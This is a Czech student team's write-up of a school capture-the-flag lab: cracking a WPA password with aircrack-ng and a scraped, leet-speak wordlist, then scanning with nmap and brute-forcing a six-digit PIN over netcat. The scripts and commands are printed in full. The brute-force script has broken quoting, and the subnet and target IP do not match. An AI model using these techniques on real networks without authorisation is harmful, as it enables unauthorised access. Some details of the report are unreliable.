Tým: Rýdl, Sadílek, Soukup
Datum: 2026-04-27
Místo: Smíchovská střední
Zadavatel: Pan učitel Vacek
Scope:
```
Připojení na wifi: Sablik EU
Použít aircrack
vytvořit si vlastní wordlist
použití leet speak
heslo je lowercase + ENG[a-z]
po připojeni na wifi:
pouzit nmap a najit PC v siti
zde bude jeden s otevreným specifickým portem
nasledne se na PC dostat a sebrat flagu
```
Postupovali jsme čistě v mezích zadání 

# Postup:
## Zjištění hesla na wifi:
### Použili jsme aircrack-ng:
```
sudo airmon-ng = vypsíše dostupne siťové karty
sudo airmon-ng <sitova karta> = aktivuje sitovou kartu
sudo airodump-ng = vypiše dostupne site
airodump -w <slozka> --essid <nazev site> -c <Chanel>
```
počkali jsme na handshake zařizení v zájmové síti
handshake je uložen jako `*.cap`
### Vytvoření vlastního wordlistu
podle nazvu wifi jsme dospěli k nazoru, že slovo použité jako heslo je z webu: `sablikdosenatu.cz` 
udělali jsme si bash script, který nám vybral všechna slova z webové stránky
tento wordlist jsme projeli dalším scriptem, které to předělal na `leet speak`
Ukázka podobneho scriptu:
*stažení slov a ulozeni do wordlistu:*
```
#!/bin/bash

# Kontrola, zda byl zadán argument (URL)
if [ -z "$1" ]; then
    echo "Použití: $0 <URL>"
    exit 1
fi

URL=$1
OUTPUT="wordlist.txt"

echo "Stahuji a zpracovávám: $URL..."

# 1. curl: stáhne zdrojový kód
# 2. lynx -dump: převede HTML na čistý text
# 3. tr: převede vše na malá písmena
# 4. tr: nahradí vše, co není písmeno, mezerou
# 5. tr -s: zmáčkne více mezer do jedné a nahradí je novým řádkem (každé slovo na nový řádek)
# 6. sort -u: seřadí slova a odstraní duplicity

curl -sL "$URL" | lynx -dump -stdin -nolist | \
    tr '[:upper:]' '[:lower:]' | \
    tr -c '[:alpha:][:digit:]' ' ' | \
    tr -s ' ' '\n' | \
    sort -u > "$OUTPUT"

echo "Hotovo! Wordlist byl uložen do souboru: $OUTPUT"
echo "Počet unikátních slov: $(wc -l < "$OUTPUT")"
```

*předělaní wordlistu na leet speak:*
```
#!/bin/bash

# Definice vstupního a výstupního souboru
INPUT_FILE="wordlist.txt"
OUTPUT_FILE="wordlist_leet.txt"

# Kontrola, zda vstupní soubor existuje
if [ ! -f "$INPUT_FILE" ]; then
    echo "Chyba: Soubor $INPUT_FILE neexistuje!"
    exit 1
fi

echo "Převádím wordlist do Leet speaku..."

# Samotný převod pomocí sed
# g = globálně (všechny výskyty v řádku)
# Používáme transformaci, která pokryje nejčastější záměny
cat "$INPUT_FILE" | sed '
    s/a/4/g; s/A/4/g;
    s/e/3/g; s/E/3/g;
    s/i/1/g; s/I/1/g;
    s/o/0/g; s/O/0/g;
    s/s/5/g; s/S/5/g;
    s/t/7/g; s/T/7/g;
    s/b/8/g; s/B/8/g;
    s/g/6/g; s/G/6/g;
' > "$OUTPUT_FILE"

echo "Hotovo! Leet wordlist uložen v: $OUTPUT_FILE"
echo "Počet řádků: $(wc -l < "$OUTPUT_FILE")"
```

### Crack hesla:
použili jsme námi vytvořený wordlist a pomocí aircrack-ng jsme rozšifrovali heslo z handshaku
```
sudo aircrack-ng <*.cap soubor> -w <wordlist>
```
a počkali jsme 
nakonec aircrack-ng vratil heslo: *vysl3dky*


### Problémy:
Na některých počitačich nám nešlo to udělat. Proto jsme museli na jiný, na kterém to šlo.
Důvod proč to na původním počitači nešlo je nám neznámí a později jsme nebyli schopni ho zreprodukovat.

## Utok na PC v síti:
připojili jsme se na wifi: *sablik EU*
pomocí námi zjištěného hesla: *vysl3dky*

### Nmap sítě:
ip sitě byla 10.25.194.`<ip clienta>`/24
```
nmap <ip sitě>/<maska sítě>
```
zjistění ip adresy PC, na který budeme utočit: *10.103.6.18*
### Připojení na server:
pomocí nmap jsme zjistili, že na PC je otevřen port **54321** 
při pokusu o připojení to po nás chce 6 místný kód, který se po úspěšném připojení změní.
vytvořili jsme si bash script, který se vždy připojí a zkusí bruteforce pinu na wifi

#### Bruteforce:

ukazka naseho Bruteforce scriptu:
```
#!/bin/bash

HOST="10.103.6.18 PORT="54321"

for line in $(cat 6digits.txt); do
response=$(printf "%s\n" "$line" | nc -w 3 "$HOST "$PORT 2>/dev/null)

echo "Server odpověděl:"
echo "$response
echo "$line"

done
```

tento script si z wordlistu vybere specifickou line s cislem. tu použije jako heslo a pokusí se připojit na daný port. použili jsme Netcat, která testuje porty.

Dále je to jen waiting simulator. Čekali jsme asi 10 min.
Heslo nám script bruteforcenout: "**356284**"
po dlouhém čekání nám wireshark ukázal response. v ní byla flaga: "**You_Did_It_-1xX**"
### Připojení:

Po úspěšném připojení na port serveru nám port vrátil flagu: 
# Závěr:
Na wifi: "**Sablik EU**" jsme se připojili. Nmap sítě nám odhalil ip serveru: "**10.103.6.18**", další Nmap našel port: "**54321**". 
Poté jsme si udělali bash script použivající Netcat. 
Heslo se po každém připojení mění takže jsme měli štěstí. Heslo bylo: "**356284**"
Po uspěšném připojení nám port vrátil flagu: "**You_Did_It_-1xX** ". 

